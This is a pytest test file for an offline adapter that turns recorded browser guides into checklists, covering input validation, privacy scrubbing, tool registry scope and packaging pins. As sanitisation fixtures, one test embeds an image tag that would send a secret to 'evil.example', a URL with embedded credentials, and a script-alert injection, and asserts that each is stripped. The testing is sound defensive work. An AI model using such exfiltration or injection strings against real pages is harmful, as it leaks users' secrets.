"""Offline adapter/packaging contracts. No extension, real recording or replay."""
from __future__ import annotations

import asyncio
import copy
import hashlib
import importlib.util
import json
from pathlib import Path
import socket
from types import SimpleNamespace

import pytest

from bcc import mimik_skill as mimik
from bcc.features import mimik as feature
from bcc.tools import ToolContext, ToolRegistry, context_denial, execute_tool
from bcc.v2.skill_library import SkillLibrary, skill_contract

ROOT = Path(__file__).resolve().parents[2]


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    def refused(*args, **kwargs):
        raise AssertionError("offline guide adapter attempted network/DNS")
    monkeypatch.setattr(socket, "getaddrinfo", refused)
    monkeypatch.setattr(socket, "create_connection", refused)


def step(sid="a", **values):
    return {"id": sid, "guideId": "g", "index": 0, "description": "Click Models",
            "action": "click", "url": "http://127.0.0.1:8800/#models",
            "timestamp": 1789948800000, **values}


def snapshot(steps=None):
    steps = [step()] if steps is None else steps
    return {"title": "Owner test", "stepIds": [s["id"] for s in steps], "steps": steps}


def markdown(body="## Step 01: Click Models", title="Owner test"):
    return f"# {title}\n\n*1 step · Created 2026-09-20*\n\n---\n\n{body}\n"


@pytest.fixture
def registry(monkeypatch):
    registry = ToolRegistry()
    monkeypatch.setattr(feature, "REGISTRY", registry)
    asyncio.run(feature.setup(SimpleNamespace()))
    return registry


def test_pin_original_reference_bytes_and_mit_license():
    manifest = json.loads((ROOT / "integrations/mimik/UPSTREAM.json").read_text())
    assert manifest["commit"] == mimik.UPSTREAM_SHA
    for record in manifest["reference_files"]:
        body = (ROOT / record["local_path"]).read_bytes()
        assert hashlib.sha256(body).hexdigest() == record["sha256"]
        assert hashlib.sha1(f"blob {len(body)}\0".encode() + body).hexdigest() == record["git_blob"]
        assert record["modified"] is False
    body = (ROOT / "integrations/mimik/LICENSE").read_bytes()
    assert hashlib.sha256(body).hexdigest() == manifest["license_sha256"]
    assert hashlib.sha1(f"blob {len(body)}\0".encode() + body).hexdigest() == manifest["license_blob"]


def test_pinned_export_fixture_is_accepted_without_claiming_live_recording():
    text = (ROOT / "integrations/mimik/reference/export.fixture.md").read_text()
    report = mimik.prepare_guide({"markdown": text})
    assert report["action_count"] == 2 and report["block_count"] == 2
    assert report["execution_status"] == "NOT_RUN" and report["capture_verified"] is False
    assert [r["number"] for r in report["steps"] if r["kind"] == "action"] == [1, 2]
    assert report["checklist_markdown"].count("- [ ]") == 2
    assert "- [x]" not in report["checklist_markdown"]
    assert report["network_requests"] == 0
    assert report["privacy_review_required"] is True


def test_snapshot_uses_stepids_order_without_mutation_and_success_is_only_callout():
    values = [step("a"), step("heading", blockType="heading", description="Preparation"),
              step("b", index=1, description="Click Save"),
              step("note", blockType="callout", calloutVariant="success", description="PASS")]
    data = snapshot(values)
    data["stepIds"] = ["heading", "b", "note", "a"]
    original = copy.deepcopy(data)
    report = mimik.prepare_guide({"snapshot": data})
    assert data == original
    assert report["action_count"] == 2
    assert [r["description"] for r in report["steps"]] == ["Preparation", "Click Save", "PASS", "Click Models"]
    note = report["steps"][2]
    assert note["variant"] == "success" and "number" not in note
    assert report["execution_status"] == "NOT_RUN"
    assert all(r["execution_status"] == "NOT_RUN" for r in report["steps"] if r["kind"] == "action")


@pytest.mark.parametrize("args", [{}, {"markdown": "x", "snapshot": {}},
    {"path": "/private/guide.md"}, {"markdown": markdown(), "approved": True},
    {"snapshot": {"title": "x", "stepIds": [], "steps": [], "settings": {"aiApiKey": "secret"}}},
    {"markdown": None}, {"markdown": 1}, {"markdown": "x" * (mimik.MAX_MARKDOWN + 1)},
    {"markdown": markdown("## Step 02: Click Save")},
    {"markdown": markdown("## Step 01: First\n\n## Step 01: Duplicate")},
    {"markdown": "# x\n## Step 01: no separator"}, {"markdown": "no title\n---"},
    {"markdown": markdown("unexpected structural text")},
    {"markdown": markdown("## Step 01: " + "x" * 2001)},
    {"markdown": markdown("## Step 01: x\x00")}, {"markdown": markdown("## Step 01: x\ud800")}])
def test_invalid_or_unsupported_input_is_not_success(args):
    with pytest.raises(mimik.GuideInputError):
        mimik.prepare_guide(args)


@pytest.mark.parametrize("changes", [{"index": True}, {"index": -1}, {"index": 81},
    {"timestamp": True}, {"timestamp": float("nan")}, {"timestamp": float("inf")},
    {"timestamp": -1}, {"timestamp": 10 ** 1000}, {"description": ""},
    {"description": "x" * 2001}, {"action": None}, {"url": 1},
    {"blockType": None}, {"blockType": "success"}, {"blockType": []},
    {"calloutVariant": "PASS"}, {"elementMeta": []}, {"secret_setting": "hidden"}])
def test_invalid_snapshot_fields_fail_closed(changes):
    with pytest.raises(mimik.GuideInputError):
        mimik.prepare_guide({"snapshot": snapshot([step(**changes)])})


@pytest.mark.parametrize("data", [snapshot([step(), step()]),
    {"title": "x", "stepIds": ["missing"], "steps": [step()]},
    {"title": "x", "stepIds": [], "steps": [step()]},
    snapshot([step(str(i)) for i in range(81)]),
    snapshot([step(str(i), description="x" * 2000) for i in range(21)])])
def test_inconsistent_or_large_snapshot_is_refused(data):
    with pytest.raises(mimik.GuideInputError):
        mimik.prepare_guide({"snapshot": data})


def test_empty_guide_and_only_blocks_are_not_completed_actions():
    for value in ({"snapshot": snapshot([])}, {"markdown": markdown("## Preparation\n\n> **Success**\n> all done")}):
        report = mimik.prepare_guide(value)
        assert report["status"] == "NO_ACTION_STEPS"
        assert report["action_count"] == 0 and report["execution_status"] == "NOT_RUN"


def test_images_urls_html_secrets_and_input_values_do_not_become_active_output():
    secret = "THIS_IS_A_PRIVATE_VALUE"
    data = snapshot([step(description=f'Click <img src="https://evil.example/secret?q={secret}"> '
                                      'token=hiddenvalue person@example.com',
                          url=f"https://user:password@news.example/path/{secret}?token=x#part",
                          screenshotId="s1"),
                     step("b", index=1, action="input", inputValue=secret,
                          description=secret, elementMeta={"inputType": "password", "cssSelector": secret})])
    report = mimik.prepare_guide({"snapshot": data})
    output = json.dumps(report, ensure_ascii=False)
    assert secret not in output and "hiddenvalue" not in output and "person@example.com" not in output
    assert "<img" not in output and "user:password" not in output
    assert "cssSelector" not in output and "inputValue" not in output
    assert report["steps"][0]["origin"] == "https://news.example"
    assert report["screenshots_omitted"] == 1 and report["screenshots_verified"] is False
    assert "содержимое скрыто" in report["steps"][1]["description"]


def test_multiline_input_description_is_not_leaked_and_images_never_decoded():
    report = mimik.prepare_guide({"markdown": markdown(
        '## Step 01: Type a private value\nPRIVATE_TYPED_VALUE\n\n'
        '![secret image](data:image/png;base64,NOT_EVEN_BASE64)\n\n'
        '## Step 02: Click Next\n<script>alert(1)</script>')})
    output = json.dumps(report)
    assert "PRIVATE_TYPED_VALUE" not in output and "NOT_EVEN_BASE64" not in output
    assert "<script>" not in output
    assert report["screenshots_omitted"] == 1 and report["action_count"] == 2


@pytest.mark.parametrize("label", ["Step", "Paso", "Étape", "Schritt", "Шаг"])
def test_numbered_locale_labels_in_declared_format(label):
    report = mimik.prepare_guide({"markdown": markdown(f"## {label} 01: Click Save")})
    assert report["action_count"] == 1


def test_tool_registry_skill_contract_and_scope(registry, tmp_path):
    contract = skill_contract(SkillLibrary([ROOT / ".agents/skills"], tmp_path).by_id()["mimik"])
    assert contract.required_tools == ["mimik.guide"] and contract.permissions == []
    assert registry.names() == ["mimik.guide"]
    assert len(registry.schemas_for(contract.allowed_tools())) == 1
    assert feature.FEATURE.tick is None and feature.FEATURE.tick_seconds == 0
    assert all(route.methods == {"GET"} for route in feature.router.routes)
    args = {"markdown": markdown()}
    ctx = ToolContext(svc=None, task={"meta": {"skill": "mimik", "skill_input": args}}, run_id=1, agent={})
    spec = registry.get("mimik.guide")
    assert asyncio.run(context_denial(spec, copy.deepcopy(args), ctx)) is None
    result = asyncio.run(execute_tool(spec, args, ctx))
    assert not result.error and result.render().startswith("Ниже — внешние данные")
    assert result.data["execution_status"] == "NOT_RUN"
    refused = asyncio.run(execute_tool(spec, {"markdown": markdown("## Step 01: Different")}, ctx))
    assert refused.error and "differs" in refused.content


def test_invalid_tool_input_returns_error_and_status_does_not_claim_install(registry):
    ctx = ToolContext(svc=None, task={}, run_id=1, agent={})
    result = asyncio.run(execute_tool(registry.get("mimik.guide"), {"markdown": "bad"}, ctx))
    assert result.error
    status = asyncio.run(feature.status())
    assert status["recorder_installed_by_bossman"] is False
    assert status["live_capture_verified"] is False and status["background_running"] is False


def builder(monkeypatch):
    import setuptools
    monkeypatch.setattr(setuptools, "setup", lambda **kwargs: None)
    spec = importlib.util.spec_from_file_location("mimik_build_contract", ROOT / "command-center/setup.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_both_skills_packaged_by_executable_build_hook(monkeypatch, tmp_path):
    module = builder(monkeypatch)
    module.copy_open_news_assets(ROOT, tmp_path)
    module.copy_mimik_assets(ROOT, tmp_path)
    lib = SkillLibrary([tmp_path / "bcc/_skills"], tmp_path / "owner")
    assert set(lib.by_id()) == {"open-news", "mimik"}
    for folder in ("open_news_skill", "mimik_skill"):
        for name in ("LICENSE", "NOTICE.md", "UPSTREAM.json"):
            assert (tmp_path / "bcc" / folder / name).is_file()
    assert "copy_mimik_assets(repository, Path(self.build_lib))" in (ROOT / "command-center/setup.py").read_text()


def test_mimik_packaging_missing_or_tampered_asset_is_refused(monkeypatch, tmp_path):
    import shutil
    module = builder(monkeypatch)
    for name in ("integrations/mimik", ".agents/skills/mimik"):
        shutil.copytree(ROOT / name, tmp_path / name)
    module.copy_mimik_assets(tmp_path, tmp_path / "out")
    asset = tmp_path / "integrations/mimik/reference/blocks.ts"
    original = asset.read_bytes()
    asset.write_bytes(original + b"// altered\n")
    with pytest.raises(RuntimeError, match="reviewed pin"):
        module.copy_mimik_assets(tmp_path, tmp_path / "out")
    asset.write_bytes(original)
    (tmp_path / ".agents/skills/mimik/SKILL.md").unlink()
    with pytest.raises(RuntimeError, match="required package asset"):
        module.copy_mimik_assets(tmp_path, tmp_path / "out")
